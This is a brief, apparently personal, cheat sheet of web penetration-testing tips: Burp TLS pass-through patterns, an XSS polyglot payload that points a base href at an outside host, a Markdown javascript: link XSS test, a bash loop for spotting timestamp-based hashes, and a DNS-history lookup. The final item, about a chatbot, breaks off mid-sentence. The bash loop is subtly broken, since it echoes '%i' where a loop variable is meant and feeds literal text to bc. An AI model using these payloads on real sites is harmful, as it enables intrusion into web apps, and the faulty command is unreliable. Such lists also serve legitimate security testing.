1)	Burp > Proxy > TLS Pass through
	.*\.google\.com 
	.*\.gstatic\.com 
	.*\.mozilla\.com 
	.*\.googleapis\.com 
	.*\.pki\.goog
	
2) XSS Polyglot
```javascript
p=JavaScript://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/</Style/</Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus= /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```
3) https://gist.github.com/m4ll0k/31ce0505270e0a022410a50c8b6311ff
4) If an App uses Markdown, Test it for XSS  `[Click Here](javascript:alert(1))`
5) Check if  a hash generated is a curent time stamp:
 ```bash
 for i in $(seq $($(echo date +%s)-1000|bc) $($(echo date +%s)+1000|bc));do echo %i | sha256sum;done
```
6) Find origin IP by looking at DNS history: https://whoisrequest.com/history/
7) Check if chatbot (How may I help you popup) returns data after